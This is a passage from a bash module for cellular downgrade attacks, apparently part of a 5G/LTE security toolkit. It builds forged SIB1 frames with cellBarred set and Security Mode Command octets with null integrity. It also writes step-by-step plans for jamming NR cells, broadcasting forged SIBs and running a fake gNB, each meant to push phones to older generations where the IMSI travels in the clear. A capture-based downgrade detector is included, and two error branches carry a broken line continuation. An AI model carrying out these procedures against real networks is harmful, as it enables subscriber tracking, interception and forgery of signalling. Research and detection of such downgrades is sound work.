        *) return 1 ;;
    esac
}

# True when the name is an INTEGRITY algorithm.
dwn_is_integrity_alg() {
    case "${1^^}" in
        NIA0|NIA1|NIA2|NIA3|EIA0|EIA1|EIA2|EIA3|UIA0|UIA1|UIA2) return 0 ;;
        *) return 1 ;;
    esac
}

# ── Security Mode Command encoding ──────────────────────────────────────
# The Security Mode Command carries the selected NAS algorithms in a single
# octet: bits 8-5 are the ciphering algorithm, bits 4-1 the integrity
# algorithm (TS 24.501 §9.11.3.34 for 5GMM, TS 24.307 for EMM). The values
# are the assigned algorithm identifiers, and 0 means null in every case.
dwn_build_security_mode() {
    local alg="${1:-}" arg2="${2:-}" arg3="${3:-}"
    local rat="NR" integrity=""
    [[ -n "$alg" ]] || { printf 'ERROR\tusage: --build-security-mode <cipher-alg> [integrity-alg] [NR|LTE|UMTS|GSM]\n' >&2; return 2; }

    # Two calling shapes share one signature and must both keep working:
    #   --build-security-mode <alg> [RAT]                 (historical)
    #   --build-security-mode <cipher> <integrity> [RAT]  (new)
    # The second argument is a RAT name only when it is one; otherwise it is
    # the integrity algorithm. Deciding by CONTENT, not by position, is what
    # keeps the existing single-algorithm output byte-identical.
    case "${arg2^^}" in
        NR|LTE|UMTS|GSM) rat="${arg2^^}"; [[ -n "$arg3" ]] && rat="${arg3^^}" ;;
        '')              : ;;
        *)               integrity="${arg2^^}"; [[ -n "$arg3" ]] && rat="${arg3^^}" ;;
    esac
    local a="${alg^^}"
    local cipher_n integrity_n

    # The single-algorithm form is unchanged: one name sets BOTH fields, and
    # an integrity name given alone implies the matching cipher (this is the
    # historical behaviour and the existing assertions depend on it).
    if [[ -z "$integrity" ]]; then
        case "$a" in
            NEA0|NIA0) cipher_n=0; integrity_n=0 ;;
            NEA1|NIA1) cipher_n=1; integrity_n=1 ;;
            NEA2|NIA2) cipher_n=2; integrity_n=2 ;;
            NEA3|NIA3) cipher_n=3; integrity_n=3 ;;
            EEA0|EIA0) cipher_n=0; integrity_n=0 ;;
            EEA1|EIA1) cipher_n=1; integrity_n=1 ;;
            EEA2|EIA2) cipher_n=2; integrity_n=2 ;;
            EEA3|EIA3) cipher_n=3; integrity_n=3 ;;
            UEA0|UIA0) cipher_n=0; integrity_n=0 ;;
            UEA1|UIA1) cipher_n=1; integrity_n=1 ;;
            UEA2|UIA2) cipher_n=2; integrity_n=2 ;;
            A5/0|A50)  cipher_n=0; integrity_n=0 ;;
            A5/1|A51)  cipher_n=1; integrity_n=0 ;;
            A5/2|A52)  cipher_n=2; integrity_n=0 ;;
            A5/3|A53)  cipher_n=3; integrity_n=0 ;;
            *) printf 'ERROR\tunknown algorithm: %s\n' "$(dwn_sanitize "$alg")" >&2; return 2 ;;
        esac
        integrity="$a"
    else
        # Two-argument form: cipher and integrity are named independently, so
        # the realistic downgrade (strong ciphering, null integrity) is
        # representable at all.
        local i="${integrity^^}"
        dwn_is_cipher_alg "$a" || {
            printf 'ERROR\tfirst argument must be a ciphering algorithm, got: %s\n' \
                "$(dwn_sanitize "$alg")" >&2; return 2; }
        dwn_is_integrity_alg "$i" || {
            printf 'ERROR\tsecond argument must be an integrity algorithm, got: %s\n' \
                "$(dwn_sanitize "$integrity")" >&2; return 2; }
        cipher_n=$(dwn_alg_id "$a")       || { printf 'ERROR\tunknown algorithm: %s\n' "$(dwn_sanitize "$alg")" >&2; return 2; }
        integrity_n=$(dwn_alg_id "$i")    || { printf 'ERROR\tunknown algorithm: %s\n' "$(dwn_sanitize "$integrity")" >&2; return 2; }
        integrity="$i"
    fi

    local octet=$(( (cipher_n << 4) | integrity_n ))
    printf 'rat\t%s\n'            "$rat"
    printf 'algorithm\t%s\n'      "$a"
    printf 'integrity_algorithm\t%s\n' "$integrity"
    printf 'cipher_id\t%s\n'      "$cipher_n"
    printf 'integrity_id\t%s\n'   "$integrity_n"
    printf 'smc_octet\t%02X\n'    "$(( octet & 0xFF ))"
    printf 'smc_bits\t%s\n'       "$(printf '%08d' "$(echo "obase=2;$octet" | bc)")"
    # Null-ciphering and null-integrity are decided SEPARATELY. Reporting a
    # single "null_algorithm" flag would hide the module's own subject matter:
    # NEA2 with NIA0 is a strong cipher with no integrity, not a null session.
    local is_gsm=0
    [[ "${rat^^}" == "GSM" ]] && is_gsm=1
    if dwn_is_null_alg "$a"; then
        printf 'cipher_null\tyes\n'
    else
        printf 'cipher_null\tno\n'
    fi
    if (( is_gsm )); then
        printf 'integrity_null\tn/a\n'
    elif dwn_is_null_alg "$integrity"; then
        printf 'integrity_null\tyes\n'
    else
        printf 'integrity_null\tno\n'
    fi
    # GSM carries no integrity algorithm, so the null question there is
    # entirely about the cipher. Everywhere else BOTH must be null for the
    # session to be a true null session.
    if dwn_is_null_alg "$a" && { (( is_gsm )) || dwn_is_null_alg "$integrity"; }; then
        printf 'null_algorithm\tyes\n'
        if (( is_gsm )); then
            printf 'exposure\tno ciphering: the IMSI and all traffic are in the clear\n'
        else
            printf 'exposure\tno confidentiality and no integrity: the session is readable and forgeable\n'
        fi
    else
        printf 'null_algorithm\tno\n'
        if dwn_is_null_alg "$a" || { (( ! is_gsm )) && dwn_is_null_alg "$integrity"; }; then
            printf 'exposure\tpartial: %s\n' "$(dwn_null_exposure "$a" "$integrity" "${rat^^}")"
        fi
    fi
    # A ciphering algorithm with no integrity algorithm beside it is the
    # signature of a steered session, so name it where it happens.
    if ! dwn_is_null_alg "$a" && (( ! is_gsm )) && dwn_is_null_alg "$integrity"; then
        printf 'downgrade_signature\tcipher!=integrity: strong ciphering with null integrity — signalling is forgeable while the traffic looks protected\n'
    fi
    # GSM has no integrity algorithm at all, which is the point.
    if (( is_gsm )); then
        printf 'integrity_available\tno (GSM has no integrity protection on the air interface)\n'
    fi
}

# ── SIB1 with cellBarred — the forged-SIB downgrade vector ──────────────
#
# The module header describes suppressing a higher-RAT cell with a forged SIB
# carrying cellBarred. The *encoding* half of that is pure computation and is
# done here for real; the transmit half is the `forged-sib` plan.
#
# Layout is the tree's own SIB1 body convention, which is what
# `10_lte_air.sh --decode-sib 1` parses:
#
#   PLMN        3 octets   TS 24.008 §10.5.1.3 BCD (MCC digit2|digit1,
#                          MNC digit3|MCC digit3, MNC digit2|digit1)
#   TAC         2 octets   tracking area code, 16 bits
#   cellIdentity 28 bits   = 7 nibbles, TS 36.331 §6.2.2
#                 = 17 nibbles total
#
# cellBarred and intraFreqReselection are appended as one further octet so a
# built SIB1 round-trips through that reader with the flag set:
#
#   bit 7   cellBarred           1 = barred, 0 = notBarred
#   bit 6   intraFreqReselection 1 = notAllowed, 0 = allowed
#
# This is NOT TS 36.331 APER. Real SIB1 is bit-packed and cellBarred sits
# inside cellAccessRelatedInfo behind a CHOICE, so a bit-exact encoding needs
# an APER codec this tree does not ship. What is real here is the field layout
# and the values — which is what a lab needs in order to build the frame it
# broadcasts with srsRAN or OpenAirInterface, and enough for the reader above
# to confirm the flag survived. The distinction is stated in the output.
dwn_encode_plmn() {
    local mcc="${1:-}" mnc="${2:-}"
    [[ "$mcc" =~ ^[0-9]{3}$ ]] || return 1
    [[ "$mnc" =~ ^[0-9]{2,3}$ ]] || return 1
    local m1="${mcc:0:1}" m2="${mcc:1:1}" m3="${mcc:2:1}"
    local n1 n2 n3
    if (( ${#mnc} == 3 )); then
        n1="${mnc:0:1}"; n2="${mnc:1:1}"; n3="${mnc:2:1}"
    else
        n1="${mnc:0:1}"; n2="${mnc:1:1}"; n3="f"
    fi
    printf '%s%s%s%s%s%s' "$m2" "$m1" "$n3" "$m3" "$n2" "$n1"
}

dwn_build_sib1() {
    local mcc="${1:-001}" mnc="${2:-01}" tac="${3:-1}" cellid="${4:-0}" barred="${5:-barred}"
    local intra="${6:-notAllowed}"

    local plmn
    plmn=$(dwn_encode_plmn "$mcc" "$mnc") || {
        printf 'ERROR\tbad PLMN: mcc=%s mnc=%s (want 3 and 2-3 digits)\n' \
            "$(dwn_sanitize "$mcc")" "$(dwn_sanitize "$mnc")" >&2; return 1; }
    [[ "$tac" =~ ^[0-9]+$ ]] && (( tac >= 0 && tac <= 65535 )) || {
        printf 'ERROR\tTAC out of range: %s (want 0..65535)\n' "$(dwn_sanitize "$tac")" >&2; return 1; }
    [[ "$cellid" =~ ^[0-9]+$ ]] && (( cellid >= 0 && cellid <= 268435455 )) || {
        printf 'ERROR\tcellIdentity out of range: %s (want 0..2^28-1 = 268435455)\n' \
            "$(dwn_sanitize "$cellid")" >&2; return 1; }

    local barred_bit intra_bit
    case "$barred" in
        barred)    barred_bit=1 ;;
        notBarred) barred_bit=0 ;;
        *) printf 'ERROR\tbad cellBarred: %s (want barred|notBarred)\n' "$(dwn_sanitize "$barred")" >&2; return 1 ;;
    esac
    case "$intra" in
        notAllowed) intra_bit=1 ;;
        allowed)    intra_bit=0 ;;
        *) printf 'ERROR\tbad intraFreqReselection: %s (want allowed|notAllowed)\n' "$(dwn_sanitize "$intra")" >&2; return 1 ;;
    esac

    local tac_hex cell_hex flags
    tac_hex=$(printf '%04x' "$tac")
    cell_hex=$(printf '%07x' "$cellid")
    flags=$(printf '%02x' "$(( barred_bit * 128 + intra_bit * 64 ))")

    local body="${plmn}${tac_hex}${cell_hex}"
    printf 'message\tSIB1 (SystemInformationBlockType1)\n'
    printf 'encoding\ttree nibble convention (see module notes) — NOT TS 36.331 APER\n'
    printf 'plmn_octets\t%s\n' "$plmn"
    printf 'mcc\t%s\n' "$mcc"
    printf 'mnc\t%s\n' "$mnc"
    printf 'tracking_area_code\t%s\n' "$tac"
    printf 'tracking_area_code_hex\t%s\n' "$tac_hex"
    printf 'cell_identity\t%s\n' "$cellid"
    printf 'cell_identity_hex\t%s\n' "$cell_hex"
    printf 'cell_barred\t%s\n' "$barred"
    printf 'intra_freq_reselection\t%s\n' "$intra"
    printf 'flags_octet\t%s\n' "$flags"
    printf 'body\t%s\n' "$body"
    printf 'body_with_flags\t%s%s\n' "$body" "$flags"
    printf 'nibbles\t%s\n' "$(( ${#body} + ${#flags} ))"
    printf 'decode_with\t10_lte_air.sh --decode-sib 1 <body>\n'
}

# One line describing what a given cipher/integrity pair leaves exposed.
dwn_null_exposure() {
    local cipher="${1:-}" integrity="${2:-}" rat="${3:-}"
    if dwn_is_null_alg "$cipher" && dwn_is_null_alg "$integrity"; then
        printf 'no confidentiality and no integrity: the session is readable and forgeable'
    elif dwn_is_null_alg "$cipher"; then
        printf 'null ciphering with %s integrity: the traffic is readable but not forgeable' "$integrity"
    elif dwn_is_null_alg "$integrity"; then
        printf '%s ciphering with null integrity: the traffic is confidential but every signalling message is forgeable' "$cipher"
    else
        printf '%s/%s: no null algorithm selected' "$cipher" "$integrity"
    fi
}

# ── the downgrade paths ─────────────────────────────────────────────────
# Three concrete mechanisms, each stated with what it needs and what the UE
# does in response. These are descriptions of real behaviour, not guesses.
dwn_path() {
    local name="${1:-}"
    case "$name" in
        steer-down)
            printf 'path\tsteer-down\n'
            printf 'generation\t5G -> 4G\n'
            printf 'mechanism\t%s\n' "answer the Registration Request with a 5GMM Registration Reject carrying cause 27 (N1 mode not allowed) or 31 (Redirection to EPC required)"
            printf 'ue_behaviour\t%s\n' "on cause 27 the UE disables N1 mode capability and reselects E-UTRAN; on cause 31 it performs an EPS attach"
            printf 'requires\t%s\n' "a core network that will emit the reject, or a forged reject on a link the UE follows"
            printf 'detect_by\t%s\n' "a Registration Reject with cause 27/31 followed by an EPS Attach from the same IMSI"
            printf 'status\t%s\n' "encodable here; emitting it needs the plan"
            ;;
        jamming-suppress)
            printf 'path\tjamming-suppress\n'
            printf 'generation\t5G -> 4G (or 4G -> 3G/2G)\n'
            printf 'mechanism\t%s\n' "raise the noise floor on the NR downlink around the SSB so cell search fails, then let the UE fall back"
            printf 'ue_behaviour\t%s\n' "S-criterion failure on NR triggers reselection to the strongest lower-RAT cell"
            printf 'requires\t%s\n' "a transmit-capable SDR (HackRF, BladeRF, USRP or LimeSDR) and a licence for the band"
            printf 'detect_by\t%s\n' "an NR measurement report that disappears while LTE RSRP is unchanged, then a RAT change with no reject cause"
            printf 'status\t%s\n' "handoff — needs a radio"
            ;;
        cs-fallback)
            printf 'path\tcs-fallback\n'
            printf 'generation\t4G/5G -> 3G/2G\n'
            printf 'mechanism\t%s\n' "force a mobile-terminated or mobile-originated CS service; with no IMS the UE falls back to UTRAN/GERAN"
            printf 'ue_behaviour\t%s\n' "EPS Fallback or RRC Connection Release with redirectedCarrierInfo towards UTRAN/GERAN"
            printf 'imsi_exposure\t%s\n' "yes — a 2G fallback performs a Location Update that can request the IMSI in the clear"
            printf 'cipher_negotiated\t%s\n' "A5/1 or worse is common; A5/0 if the network allows it"
            printf 'requires\t%s\n' "a 2G/3G radio access network reachable from the target area, or a testbed femto"
            printf 'detect_by\t%s\n' "an S1 Release or handover to UTRAN/GERAN, followed by a Location Updating Request and an Identity Request (IMSI)"
            printf 'status\t%s\n' "handoff — needs the legacy RAN"
            ;;
        forged-sib)
            printf 'path\tforged-sib\n'
            printf 'generation\t5G -> 4G (or 4G -> 3G/2G)\n'
            printf 'mechanism\t%s\n' "broadcast a SIB1 for the target cell with cellBarred=barred so the UE treats the cell as unavailable and reselects the strongest remaining RAT"
            printf 'ue_behaviour\t%s\n' "cellBarred is a normal broadcast field, so the UE reports no error — it simply considers the cell barred and performs cell reselection"
            printf 'sib_fields\t%s\n' "cellAccessRelatedInfo.cellBarred (barred|notBarred) and intraFreqReselection (allowed|notAllowed), TS 36.331 6.2.2"
            printf 'requires\t%s\n' "a transmit-capable SDR (HackRF, BladeRF, USRP or LimeSDR) and srsRAN or OpenAirInterface able to broadcast a modified SIB1"
            printf 'detect_by\t%s\n' "a SIB1 whose cellBarred is barred while the cell is still transmitting normally, followed by a RAT change with no reject cause and no measurement-report gap"
            printf 'status\t%s\n' "encoding half is real — $0 --build-sib1; broadcasting it is the forged-sib plan"
            ;;
        sni5gect)
            printf 'path\tsni5gect\n'
            printf 'generation\t5G -> 4G\n'
            printf 'mechanism\t%s\n' "the Registration Request crosses the air before any security context exists, so its SUCI travels unprotected; a fake gNB reads it, answers with a Registration Reject (cause 27, 31 or 22) before AKA runs, and the UE follows the reject to E-UTRAN"
            printf 'ue_behaviour\t%s\n' "cause 27 disables N1 mode capability so the UE reselects E-UTRAN and performs an EPS Attach; cause 31 sends it to the EPC directly; in both cases no Security Mode Command is ever completed, so no 5G key is established"
            printf 'imsi_exposure\t%s\n' "yes — the SUCI is readable pre-authentication when the home network uses the null scheme (TS 33.501 Annex C) or when the reader holds the home-network public key; the 4G Attach that follows then asks for the IMSI in the clear"
            printf 'detect_by\t%s\n' "a Registration Request carrying a SUCI, a Registration Reject, and no Security Mode Command between them, then an EPS Attach from the same subscriber inside the reselection window"
            printf 'requires\t%s\n' "a fake gNB broadcasting an SSB on the target PLMN that the UE will select, and something that answers N1 NAS — 55_nr_inject owns the transmit half, 58_suci_catcher owns the SUCI decode"
            printf 'status\t%s\n' "encoding half is real — $0 --reject-cause 27 and 58_suci_catcher.sh --parse <suci>; the gNB is the plan"
            ;;
        *) printf 'ERROR\tunknown path: %s (want steer-down|jamming-suppress|cs-fallback|forged-sib|sni5gect)\n' \\
               "$(dwn_sanitize "$name")" >&2; return 2 ;;
    esac
}

# ── detection ───────────────────────────────────────────────────────────
# Given a capture-derived TSV, identify a downgrade from three independent
# signals:
#   1. a RAT change where the higher RAT was present before
#   2. a reject cause that steers away from the higher RAT
#   3. a cipher change to a null algorithm across the transition
# The input format is one record per line:
#   ts  rat  event  detail
# where event is one of: attach, reject, rat_change, cipher, measurement
dwn_sample_capture() {
    # A synthetic capture that contains all three downgrade signatures, used
    # by the selftest and as the documented input format.
    cat << 'EOF'
1	NR	attach	Registration Request imsi=208011234567890
2	NR	reject	Registration Reject cause=27 name=N1 mode not allowed
3	NR	rat_change	NR -> LTE
4	LTE	attach	Attach Request imsi=208011234567890
5	LTE	cipher	cipher=EEA1 integrity=EIA1
6	LTE	measurement	rsrp=-95 earfcn=6300
7	LTE	cipher	cipher=EEA0 integrity=EIA0
EOF
}

dwn_detect() {
    local file="${1:-}"
    [[ -n "$file" ]] || { printf 'ERROR\tusage: --detect <pcap-or-tsv>\n' >&2; return 2; }
    [[ -f "$file" ]] || { printf 'ERROR\tno such file: %s\n' "$(dwn_sanitize "$file")" >&2; return 1; }
    [[ -r "$file" ]] || { printf 'ERROR\tcannot read: %s\n' "$(dwn_sanitize "$file")" >&2; return 1; }

    # A pcap needs tshark; a TSV record file is read directly.
    local work="$file"
    if [[ "$file" == *.pcap || "$file" == *.pcapng ]]; then
        command -v tshark >/dev/null 2>&1 || {
            printf 'ERROR\tno tshark — install wireshark-cli to read captures\n' >&2; return 1; }
        work="$MOD_TMP/detect.tsv"
        if ! tshark -r "$file" -T fields \
              -e frame.time_epoch -e _ws.col.Protocol -e _ws.col.Info 2>/dev/null \
              | awk -F'\t' '
                    NF>=3 && $3!="" {
                        info=$3; i=tolower(info); ev="other"
                        if (i ~ /reject/)                            ev="reject"
                        else if (i ~ /rat_change|rat change|handover/) ev="rat_change"
                        else if (i ~ /cipher/)                        ev="cipher_change"
                        printf "%s\t%s\t%s\t%s\n", $1, $2, ev, info
                    }' > "$work"; then
            printf 'ERROR\ttshark could not read %s\n' "$(dwn_sanitize "$file")" >&2
            return 1
        fi
        [[ -s "$work" ]] || {
            printf 'ERROR\tno protocol records found in %s\n' "$(dwn_sanitize "$file")" >&2; return 1; }
    fi

    local records=0
    records=$(grep -c . "$work" 2>/dev/null || echo 0)
    (( records > 0 )) || { printf 'ERROR\tno records in %s\n' "$(dwn_sanitize "$file")" >&2; return 1; }

    # Signal 1: a steering reject cause.
    local steers
    steers=$(awk -F'\t' '
        tolower($3) ~ /reject/ {
            n=""
            if (match($4, /cause=[0-9]+/)) { n=substr($4, RSTART+6, RLENGTH-6) }
            if (n == 7 || n == 11 || n == 12 || n == 13 || n == 14 || n == 15 || n == 27 || n == 31) print $0
        }' "$work")
    # Signal 2: a RAT change downwards.
    local ratdown
    ratdown=$(awk -F'\t' 'tolower($3) ~ /rat_change|rat change|handover/ {print $0}' "$work")
    # Signal 3: a cipher change to null.
    local nullcipher
    nullcipher=$(awk -F'\t' '
        tolower($3) ~ /cipher/ && tolower($4) ~ /(eea0|nea0|uea0|a5\/0|a50)/ {print $0}' "$work")
    # Signal 4: the absence of a higher-RAT measurement after a change.
    local rats; rats=$(awk -F'\t' '{print toupper($2)}' "$work" | sort -u | tr '\n' ' ')

    printf 'file\t%s\n' "$(dwn_sanitize "$file")"
    printf 'records\t%s\n' "$records"
    printf 'rats_seen\t%s\n' "$(dwn_sanitize "$rats")"

    local n_steer n_rat n_cipher findings=0
    n_steer=$(printf '%s\n' "$steers" | grep -c . || true)
    n_rat=$(printf '%s\n' "$ratdown" | grep -c . || true)
    n_cipher=$(printf '%s\n' "$nullcipher" | grep -c . || true)
    printf 'steering_rejects\t%s\n' "$n_steer"
    printf 'rat_changes\t%s\n'      "$n_rat"
    printf 'null_ciphers\t%s\n'     "$n_cipher"

    if (( n_steer > 0 )); then
        findings=$(( findings + 1 ))
        printf 'finding\tsteering-reject\n'
        printf '%s\n' "$steers" | while IFS=$'\t' read -r ts rat ev det; do
            [[ -z "$ts" ]] && continue
            printf 'steering_reject\t%s\t%s\t%s\n' \
                "$(dwn_sanitize "$ts")" "$(dwn_sanitize "$rat")" "$(dwn_sanitize "$det")"
        done
    fi
    if (( n_rat > 0 )); then
        findings=$(( findings + 1 ))
        printf 'finding\trat-downgrade\n'
        printf '%s\n' "$ratdown" | while IFS=$'\t' read -r ts rat ev det; do
            [[ -z "$ts" ]] && continue
            printf 'rat_change\t%s\t%s\t%s\n' \
                "$(dwn_sanitize "$ts")" "$(dwn_sanitize "$rat")" "$(dwn_sanitize "$det")"
        done
    fi
    if (( n_cipher > 0 )); then
        findings=$(( findings + 1 ))
        printf 'finding\tnull-cipher\n'
        printf '%s\n' "$nullcipher" | while IFS=$'\t' read -r ts rat ev det; do
            [[ -z "$ts" ]] && continue
            printf 'null_cipher\t%s\t%s\t%s\n' \
                "$(dwn_sanitize "$ts")" "$(dwn_sanitize "$rat")" "$(dwn_sanitize "$det")"
        done
    fi

    printf 'findings\t%s\n' "$findings"
    if (( findings >= 2 )); then
        printf 'verdict\tDOWNGRADE\n'
    elif (( findings == 1 )); then
        printf 'verdict\tSUSPECT\n'
    else
        printf 'verdict\tCLEAN\n'
    fi
}

# ── plan files ──────────────────────────────────────────────────────────
dwn_plan() {
    local name="${1:-}"
    local f="$DWN_PLAN_DIR/${name}.plan"
    mkdir -p "$DWN_PLAN_DIR" || { printf 'ERROR\tcannot create %s\n' "$DWN_PLAN_DIR" >&2; return 1; }
    local why="" need="" steps=""
    case "$name" in
        steer-down)
            why="A UE only leaves NR because something told it to. The cheap version is a Registration Reject with a steering cause; the UE then disables N1 and reselects LTE without the attacker needing to touch the radio."
            need="A 5G core that will emit an arbitrary 5GMM cause (an Open5GS AMF with a patched registration handler, or a test AMF), and a UE or a srsRAN UE simulator to register. No SDR is required for the reject itself."
            steps="1. Stand up the AMF and confirm a normal Registration Accept first, so the baseline is known.\n2. Patch the registration handler to reject with cause 27 (N1 mode not allowed).\n3. Register a UE and capture the NAS exchange on N1.\n4. Confirm the UE disables N1 mode and attempts an EPS Attach.\n5. Repeat with cause 31 (Redirection to EPC required) and compare the UE behaviour.\n6. Record the time from reject to EPS Attach — that is the downshift window."
            ;;
        jamming-suppress)
            why="Cell search is a physical-layer procedure with a signal-to-noise threshold. Raising the noise floor around the SSB makes the NR cell undiscoverable, and the UE reselects the strongest remaining RAT."
            need="A transmit-capable SDR — HackRF, BladeRF, USRP (B200/B210) or LimeSDR — with a suitable antenna, plus lawful authority for the band and power. An rtl-sdr cannot transmit."
            steps="1. Survey the NR cell: SSB ARFCN, GSCN and RSRP (module 12_nr_air.sh --arfcn / --ssb).\n2. Record the baseline RSRP and the serving LTE neighbour RSRP.\n3. Transmit band-limited noise centred on the SSB and raise power slowly.\n4. Watch for the NR measurement report to stop while LTE RSRP is unchanged.\n5. Observe the reselection to LTE and record the delay.\n6. Stop transmitting and confirm the UE returns to NR."
            ;;
        cs-fallback)
            why="A CS service with no IMS forces EPS Fallback, and the legacy RAN it lands on negotiates from a much weaker cipher set. This is where an IMSI becomes visible."
            need="A 2G or 3G radio access network reachable by the target UE (a lab femto, a test UTRAN/GERAN cell, or an operator network permitting roaming), plus a UE and a way to originate a CS call."
            steps="1. Confirm the target area has UTRAN/GERAN coverage the UE can select.\n2. Originate a mobile-originated CS call from the UE on the LTE/5G cell.\n3. Capture the S1/N2 release and the redirectedCarrierInfo pointing at UTRAN/GERAN.\n4. Capture the Location Updating Request on the legacy RAN.\n5. Look for an Identity Request with the IMSI identity type — that is the exposure.\n6. Record the cipher mode command and which A5/UEA algorithm was chosen."
            ;;
        forged-sib)
            why="A UE trusts the SIB it receives. SIB1 carries cellBarred, and a UE that reads cellBarred=barred on the NR cell treats it as unavailable and reselects the strongest remaining RAT — which is the downgrade, performed without touching the core network. Unlike jamming this is a valid-looking broadcast, so the UE reports no error."
            need="A transmit-capable SDR — HackRF, BladeRF, USRP (B200/B210) or LimeSDR — plus srsRAN or OpenAirInterface able to broadcast a modified SIB1, and lawful authority for the band. An rtl-sdr cannot transmit. The SIB1 body itself is built offline by $0 --build-sib1."
            steps="1. Survey the target NR cell: SSB ARFCN and GSCN ($0 --path, 12_nr_air.sh --arfcn / --ssb).\n2. Build the substitute SIB1 with the real PLMN, TAC and cellIdentity of that cell, and cellBarred set: $0 --build-sib1 <mcc> <mnc> <tac> <cellid> barred notAllowed.\n3. Confirm the body decodes back to those fields: 10_lte_air.sh --decode-sib 1 <body>.\n4. Patch the SIB1 into the srsRAN/OAI broadcast configuration and re-broadcast on the same cell identity.\n5. Watch the UE: cellBarred makes it consider the NR cell unavailable, so look for the reselection to LTE (or to 2G/3G).\n6. Record the time from the modified broadcast to the reselection — the downshift window.\n7. Stop the broadcast and confirm the UE returns to NR."
            ;;
        eps-fallback)
            why="An NR UE hands a call to E-UTRAN because NR carries no circuit domain and an operator may keep the call off IMS over 5G. TS 23.502 4.13.2 makes that an explicit procedure rather than an accident: the core or the gNB moves the UE to EPC before the call continues. The same two messages are available to whoever can answer N1 or broadcast an RRCRelease, and they land the UE on the generation whose Attach can still ask for the IMSI in the clear."
            need="Two halves, two owners, and either half works alone. Core half: an AMF that will emit 5GMM cause 31 (Redirection to EPC required) -- an Open5GS AMF with a patched registration handler, or a test AMF -- and an MME behind it. RAN half: a gNB able to send an RRCRelease with redirectedCarrierInfo=eutra -- srsRAN on a transmit SDR, or 55_nr_inject.sh for the message layer without a radio. Lawful authority for any band that is transmitted on."
            steps="1. Build both halves offline and read them back: $0 --build-fallback --redirect eutra --arfcn <earfcn> --cause 31.\n2. Confirm the NAS half is a Registration reject with cause 31 (TS 24.501 9.11.3.2) and the RRC half is DL-DCCH RRCRelease.redirectedCarrierInfo=eutra; both are decoded by an independent implementation (pycrate) in --selftest.\n3. Survey the NR cell and pick the E-UTRAN carrier the UE should land on: 12_nr_air.sh --arfcn / --ssb and 10_lte_air.sh --scan.\n4. Confirm the target E-UTRA cell is actually receivable -- a redirect to a cell the UE cannot see ends in no service, not in a downshift.\n5. Send the core half (reject) or the RAN half (RRCRelease). They are independent; the reject needs no radio at all.\n6. Watch for the EPS Attach that follows and capture it on S1/N1.\n7. In the Attach, look for an Identity Request with the IMSI identity type. That is the exposure the chain was for, and it is why 15_downgrade.sh exists.\n8. Record the delay from the reject to the Attach: that is the downshift window."
            ;;
        nr-utran-redirect)
            why="NR cannot redirect a UE to UTRAN. TS 38.331 RedirectedCarrierInfo is a CHOICE with exactly two root alternatives, nr and eutra, and no extension -- this module reads that out of pycrate's ASN.1 at run time, which is why --build-fallback --redirect utra refuses by name instead of encoding a field that does not exist. An NR-to-3G downshift is therefore two messages on two generations: an RRCRelease that lands the UE on E-UTRAN, then an E-UTRAN release (or an S1 handover) whose own RedirectedCarrierInfo carries utra-fdd or utra-tdd. CS fallback (TS 23.272) reaches the same place from an EPS Attach."
            need="A gNB able to send the first RRCRelease (srsRAN with a transmit SDR, or 55_nr_inject.sh for the message layer), an eNB that will move the UE on to UTRAN (srsLTE/srsRAN with S1 to an MME, or a lab femto), and UTRAN coverage the UE can select. Lawful authority for both bands. Neither release needs a radio to be encoded."
            steps="1. Encode leg one and read it back: $0 --build-fallback --redirect eutra --arfcn <earfcn>. The utra branch is refused by name -- do not patch a third alternative into the message, and do not believe a capture that claims one.\n2. Prepare leg two on E-UTRAN: an RRCConnectionRelease with redirectedCarrierInfo=utra-fdd (TS 36.331 6.2.2) carrying the UARFCN of the target cell, or an S1 handover to UTRAN.\n3. Confirm UTRAN coverage in the target area (34_umts_air.sh or a survey): a UE can only be redirected to a cell it can measure.\n4. Send leg one and confirm the UE attaches to E-UTRAN.\n5. Send leg two and confirm the UE selects the UTRAN cell.\n6. Capture the Location Updating Request on the legacy RAN, then the Identity Request with the IMSI identity type.\n7. Record the cipher mode command the RNC issues. UEA0/A5/0 is the null-cipher exposure --null-cipher-table describes, and it is the second half of the downgrade."
            ;;
        sni5gect)
            why="5G conceals the permanent identifier with the SUCI, and the concealment works. What it does not cover is the shape of the conversation: the Registration Request is answered before AKA establishes anything, so a gNB that is not the real one can answer it. A reject moves the UE to a generation whose Attach still requests the IMSI in the clear, and the identity the concealment was protecting is read out of the generation the UE was pushed into."
            need="A fake gNB able to broadcast an SSB on the target PLMN and answer N1-NAS (srsRAN with a modified gNB, or a USRP B210 with 55_nr_inject.sh for the message layer), plus lawful authority for the band. No core network is needed: the reject is the attacker's own message, which is what makes this cheaper than steering a real AMF."
            steps="1. Decode a captured SUCI and name its concealment scheme: 58_suci_catcher.sh --parse <suci>. A null scheme means the SUPI is the value; a profile-A/B home key means the de-concealment is offline and needs the key.\n2. Confirm the target cell: PLMN, TAC and SSB ARFCN (12_nr_air.sh --arfcn / --ssb, and $0 --path steer-down for the cause table).\n3. Encode the reject offline and read the cause back: $0 --reject-cause 27 (and 31, and 22, to compare).\n4. Stand up the fake gNB on the same PLMN with an SSB stronger than the real cell's.\n5. Answer the Registration Request with the reject before any Security Mode Command. Do not run AKA — the reject lands in the window the protocol leaves open.\n6. Watch for the reselection to E-UTRAN and capture the EPS Attach that follows.\n7. In the Attach, look for an Identity Request with the IMSI identity type. That is the permanent identity, in the clear, on the generation the UE was pushed to."
            ;;
        *) printf 'ERROR\tunknown plan: %s (want steer-down|jamming-suppress|cs-fallback|forged-sib|sni5gect|eps-fallback|nr-utran-redirect)\n' \\
               "$(dwn_sanitize "$name")" >&2; return 2 ;;
    esac
    if ! cat > "$f" <<EOF
plan: ${name}
status: handoff
module: 15_downgrade.sh
generated: $(date -u +%Y-%m-%dT%H:%M:%SZ)

what_this_is:
  A plan, not an executed attack. It names the hardware or testbed the
  vector needs and the steps to run it. The encodings this module performs
  offline (reject causes, Security Mode Command octets, the null-cipher
  table) are real and are not repeated here.

why:
  ${why}

testbed_required:
  ${need}

steps:
$(printf '%b' "  ${steps}" | sed 's/^/  /')

offline_encoders:
  $0 --reject-cause <n>
  $0 --build-security-mode <alg>
  $0 --build-sib1 <mcc> <mnc> <tac> <cellid> [barred|notBarred] [allowed|notAllowed]
  $0 --null-cipher-table

references:
  TS 24.301 9.9.3.9     EMM cause values
  TS 24.501 9.11.3.2    5GMM cause values
  TS 24.008 10.5.5.14   GMM cause values
  TS 33.501 5.5.2       NR ciphering and integrity algorithms
  TS 33.401 5.4.2       EPS ciphering and integrity algorithms
  TS 33.102 6.6         UMTS security algorithms
EOF
    then
        printf 'ERROR\tcannot write plan %s\n' "$f" >&2
        return 1
    fi
    printf 'plan\t%s\n'   "$f"
